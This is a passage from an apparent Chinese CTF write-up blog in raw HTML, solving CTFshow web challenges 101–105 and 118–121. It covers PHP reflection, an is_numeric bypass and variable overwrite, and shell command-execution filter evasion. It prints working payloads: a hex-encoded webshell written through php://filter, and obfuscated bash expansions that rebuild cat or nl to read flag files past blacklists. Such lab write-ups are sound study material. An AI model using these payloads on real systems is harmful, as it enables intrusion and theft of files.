class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$flag</span>=<span class="string">&quot;flag&#123;123123123&#125;&quot;</span>;</span><br><span class="line"><span class="keyword">const</span>  PI=<span class="number">3.14</span>;</span><br><span class="line"><span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">hello</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hello&lt;/br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="string">&#x27;A&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>-&gt;<span class="title function_ invoke__">getConstants</span>());  获取一组常量</span><br><span class="line">输出</span><br><span class="line"> <span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="string">&quot;PI&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">float</span>(<span class="number">3.14</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>-&gt;<span class="title function_ invoke__">getName</span>());    获取类名</span><br><span class="line">输出</span><br><span class="line"><span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;A&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>-&gt;<span class="title function_ invoke__">getStaticProperties</span>()); 获取静态属性</span><br><span class="line">输出</span><br><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="string">&quot;flag&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">15</span>) <span class="string">&quot;flag&#123;123123123&#125;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>-&gt;<span class="title function_ invoke__">getMethods</span>()); 获取类中的方法</span><br><span class="line">输出</span><br><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  <span class="keyword">object</span>(ReflectionMethod)<span class="comment">#2 (2) &#123;</span></span><br><span class="line">    [<span class="string">&quot;name&quot;</span>]=&gt;</span><br><span class="line">    <span class="keyword">string</span>(<span class="number">5</span>) <span class="string">&quot;hello&quot;</span></span><br><span class="line">    [<span class="string">&quot;class&quot;</span>]=&gt;</span><br><span class="line">    <span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;A&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web101"><a href="#web101" class="headerlink" title="web101"></a>web101</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;ctfshow.php&quot;</span>);</span><br><span class="line"><span class="comment">//flag in class ctfshow;</span></span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfshow</span>();</span><br><span class="line"><span class="variable">$v1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v0</span>=<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v0</span>)&#123;</span><br><span class="line">  <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\;|\?|[0-9]/&quot;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\?|[0-9]/&quot;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">      <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="subst">$v3</span>&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>和上个题差不多，也是用反射类解决的。<br><code>?v1=1&amp;v2=echo new Reflectionclass&amp;v3=;</code>，将0x2d替换掉：<br><code>3c1e313c0x2dbfc60x2d49940x2d938b0x2ddd880411ad8</code>=》<code>3c1e313c-bfc6-4994-938b-dd880411ad8</code><br>但是flag格式最后一个是12位，因此需要爆破出最一位。<br>0-c一个一个尝试就行。</p><h1 id="web102-isnumeric-and-isnumeric绕过"><a href="#web102-isnumeric-and-isnumeric绕过" class="headerlink" title="web102 isnumeric and isnumeric绕过"></a>web102 isnumeric and isnumeric绕过</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v4</span> = <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v4</span>)&#123;</span><br><span class="line">  <span class="variable">$s</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$v2</span>,<span class="number">2</span>);</span><br><span class="line">  <span class="variable">$str</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$v1</span>,<span class="variable">$s</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">  <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$v3</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>substr() 函数返回字符串的一部分。<br>call_user_func()函数把第一个参数作为回调函数调用<br>file_put_contents() 函数把一个字符串写入文件中。<br>代码分析：v4检测是否进入判断。v2会被删除掉前两个字符，v1调用方法传入删过字符的v2，再将结果写入文件v3。<br>因此核心操作语句在v2。<br>上来有个数字检测，这里要使用hex2bin。<br>php5下is_numeric可识别16进制，如0x2e，然后调用hex2bin转成字符串写入木马，但题目环境没配好，是php7,所以要另换方法。<br>用伪协议写入，所以需要base64编码后转成16进制全是数字的字符串（但是下面这个不行）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&quot;&lt;?=`cat *`;&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">bin2hex</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>;</span><br></pre></td></tr></table></figure><p>注意这个上面的不行，因为转换后的hex中除了e有其他的字符，wp中提到了使用的以下这种</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;&lt;?=`cat *`;&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$a</span>);<span class="comment">//$a=PD89YGNhdCAqYDs=</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">bin2hex</span>(<span class="string">&#x27;PD89YGNhdCAqYDs&#x27;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>;</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后生成的hex串：<code>5044383959474e6864434171594473</code>（这里的e会被当作科学计数法）为了绕过截断需要在前面随便加两个字符11，v3使用伪协议执行<br>GET：<code>?v2=115044383959474e6864434171594473&amp;v3=php://filter/write=convert.base64-decode/resource=2.php</code><br>POST传入bin2hex的反函数：<code>v1=hex2bin</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1684232663181-750fae44-4eff-4924-a3bd-20e706bf442d.png" alt="image.png"></p><h1 id="web103"><a href="#web103" class="headerlink" title="web103"></a>web103</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v4</span> = <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v4</span>)&#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$v2</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$v1</span>,<span class="variable">$s</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.*p.*h.*p.*/i&quot;</span>,<span class="variable">$str</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$v3</span>,<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Sorry&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>同上题payload</p><h1 id="web104"><a href="#web104" class="headerlink" title="web104"></a>web104</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">sha1</span>(<span class="variable">$v1</span>)==<span class="title function_ invoke__">sha1</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>get，post全传入1即可，或者传入数组<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1684233072751-3de90d66-58b6-48e9-884b-c57c50fb0185.png" alt="image.png"></p><h1 id="web105-a-变量覆盖"><a href="#web105-a-变量覆盖" class="headerlink" title="web105 $$a 变量覆盖"></a>web105 $$a 变量覆盖</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$error</span>=<span class="string">&#x27;你还想要flag嘛？&#x27;</span>;</span><br><span class="line"><span class="variable">$suces</span>=<span class="string">&#x27;既然你想要那给你吧！&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span>===<span class="string">&#x27;error&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>;</span><br><span class="line">&#125;<span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$value</span>===<span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="variable">$flag</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$error</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;your are good&quot;</span>.<span class="variable">$flag</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">die</span>(<span class="variable">$suces</span>);</span><br></pre></td></tr></table></figure><p>比赛之前遇到好多次这种题了，但是看了wp也没有很好的学明白，看到了一份wp里面讲的很清楚。<br>采用中间变量来解决：<br><code>error=a=flag</code><br>GET中error不能在等号左边。<br>POST中flag不能在等号右边。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1684234987314-7d5c585a-f312-477d-8007-4a4571cdfee2.png" alt="image.png"><br>GET：<code>a=flag</code><br>POST：<code>error=a</code><br>这样就达成了一种情况：<br>首先要知道传入的值是文本，<code>$$key=$$value</code>达成了<code>$a=$flag</code>，后半段同理，<code>$error=$a</code>这样就达成了值桥接。这样文末的判断才会判断为正。<br>看了一眼wp发现一个更牛的做法，直接get传入：<br><code>?suces=flag&amp;flag=</code><br>这就是构造的<code>suces=flag=空</code><br>后面的默认传入flag就是空对应到flag。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
            <tag> CTFshow0-1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web118-web122+web124命令执行篇（四）</title>
      <link href="/2023/04/13/web118-web122-web124%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AF%87%EF%BC%88%E5%9B%9B%EF%BC%89-md/"/>
      <url>/2023/04/13/web118-web122-web124%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AF%87%EF%BC%88%E5%9B%9B%EF%BC%89-md/</url>
      
        <content type="html"><![CDATA[<blockquote><p>参考链接：</p><p><a href="https://blog.csdn.net/weixin_46081055/article/details/121721209">https://blog.csdn.net/weixin_46081055/article/details/121721209</a></p></blockquote><h1 id="web118"><a href="#web118" class="headerlink" title="web118"></a>web118</h1><p>题目里面提示了：<code>flag in flag.php</code><br>随便提交一点东西，看到源代码中：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681292185940-62d08e5c-aa0a-41fd-99f7-c0d5ba3983e7.png" alt="image.png"><br>post上传然后system执行，但是没有回显。<br>但是输入会出现evil input，因此想到可能是有过滤。<br>fuzz一下：<br>发现有的字符被过滤掉了：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681292787888-6d27b5da-8902-4aae-8a8e-9f2a0bcbd28d.png" alt="image.png"><br>剩余的字符有<code>A-Z</code>，<code>;:&#123;&#125;?#$_,@~</code><br>看了wp学了一个新姿势：以下是在本地测试的。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681293462939-5380ccaf-846d-4c6b-8101-368008933c8a.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681293528467-e3e58553-e477-4503-9732-83c32cda2250.png" alt="image.png"><br>我们到web测试一下：<br>web上的用户名末尾为l，path末尾为n，因此我们可以尝试组合：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;PATH:~A&#125;$&#123;PWD:~A&#125;<span class="variable">$IFS</span>????.???</span><br></pre></td></tr></table></figure><p>组合成为nl查找文件。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681294107237-9cb838b1-54a0-4bcf-8595-27aff96f8054.png" alt="image.png"><br>当然也有使用别的字段的方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SHLVL是记录多个 Bash 进程实例嵌套深度的累加器,进程第一次打开shell时$&#123;SHLVL&#125;=1，然后在此shell中再打开一个shell时$&#123;SHLVL&#125;=2。</span><br><span class="line">$&#123;PWD:$&#123;#&#125;:$&#123;SHLVL&#125;&#125;就输出/</span><br><span class="line"></span><br><span class="line">$&#123;#&#125;是0，$&#123;SHLVL&#125;为1</span><br><span class="line">$&#123;#PWD&#125;是回显字符数，$&#123;PWD&#125; 是/root，$&#123;#PWD&#125;是5</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#$&#123;RANDOM&#125;是随机数，$&#123;#RANDOM&#125;一般是5，也可能是4</span><br><span class="line">$&#123;PATH:$&#123;#HOME&#125;:$&#123;#SHLVL&#125;&#125;$&#123;PATH:$&#123;#RANDOM&#125;:$&#123;#SHLVL&#125;&#125; ?$&#123;PATH:$&#123;#RANDOM&#125;:$&#123;#SHLVL&#125;&#125;??.???</span><br><span class="line"></span><br><span class="line">#其他师傅</span><br><span class="line">$&#123;PATH:~A&#125;$&#123;PATH:$&#123;#TERM&#125;:$&#123;SHLVL:~A&#125;&#125; ????.???</span><br></pre></td></tr></table></figure><h1 id="web119"><a href="#web119" class="headerlink" title="web119"></a>web119</h1><p>这道题把<code>$&#123;PATH&#125;</code>给禁用了。因此我们需要想出其他解法。<br>payload：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span>&#123;<span class="built_in">PWD</span>:<span class="variable">$</span>&#123;<span class="comment">#&#125;:$&#123;#SHLVL&#125;&#125;???$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;?$&#123;USER:~$&#123;PHP_VERSION:~A&#125;:$&#123;PHP_VERSION:~A&#125;&#125; ????.???</span></span><br><span class="line"><span class="comment"># pwd=/var/www/html</span></span><br><span class="line"><span class="comment"># USER=www-data</span></span><br><span class="line"><span class="comment"># payload即为 /???/?at ????.???</span></span><br><span class="line">为了构造/bin/<span class="built_in">cat</span> </span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681311550803-b62629a3-be2a-45fa-b3ff-1969672a8348.png" alt="image.png"><br>也可以只要a进行构造</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span>&#123;<span class="built_in">PWD</span>::<span class="variable">$</span>&#123;<span class="comment">#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?$&#123;USER:~A&#125;? ????.???</span></span><br><span class="line">/???/?a? ????.???</span><br></pre></td></tr></table></figure><p>这两个查看的时候都需要打开f12查看。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681311675416-57a9681f-d78b-491f-bc98-44afa1576ad2.png" alt="image.png"></p><h1 id="web120"><a href="#web120" class="headerlink" title="web120"></a>web120</h1><p>fuzz一下看看剩余什么可用字符：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="comment">//fuzz一下看看剩余什么字符</span></span><br><span class="line">  <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">33</span>; <span class="variable">$i</span> &lt;= <span class="number">126</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">  <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\x09|\x0a|[a-z]|[0-9]|PATH|BASH|HOME|\/|\(|\)|\[|\]|\\\\|\+|\-|\!|\=|\^|\*|\x26|\%|\&lt;|\&gt;|\&#x27;|\&quot;|\`|\||\,/&quot;</span>, <span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>)))&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681312167771-8de604f0-ffaf-4aa5-850f-4e1bef1d02dc.png" alt="image.png"><br>剩余：<code>#$.:;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ_&#123;&#125;~</code><br>通过观察，应该是还是用上一道题类似的方法。但是这次过滤了PATH|BASH|HOME三个字段。<br>所以构建payload：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span>&#123;<span class="built_in">PWD</span>::<span class="variable">$</span>&#123;<span class="comment">#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?$&#123;USER:~A&#125;? ????.???</span></span><br><span class="line">/???/?a? ????.???</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681312602829-4b269e50-195a-4a00-a726-94d2b1eda48c.png" alt="image.png"></p><h1 id="web121"><a href="#web121" class="headerlink" title="web121"></a>web121</h1><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|HOME|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\=|\^|\*|\x26|\%|\&lt;|\&gt;|\&#x27;</span>|\<span class="string">&quot;|\`|\||\,/&#x27;, <span class="variable">$code</span>))&#123;    </span></span><br><span class="line"><span class="string">        if(strlen(<span class="variable">$code</span>)&gt;65)&#123;</span></span><br><span class="line"><span class="string">            echo &#x27;&lt;div align=&quot;</span>center<span class="string">&quot;&gt;&#x27;.&#x27;you are so long , I dont like &#x27;.&#x27;&lt;/div&gt;&#x27;;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        else&#123;</span></span><br><span class="line"><span class="string">        echo &#x27;&lt;div align=&quot;</span>center<span class="string">&quot;&gt;&#x27;.system(<span class="variable">$code</span>).&#x27;&lt;/div&gt;&#x27;;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    else&#123;</span></span><br><span class="line"><span class="string">     echo &#x27;&lt;div align=&quot;</span>center<span class="string">&quot;&gt;evil input&lt;/div&gt;&#x27;;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span 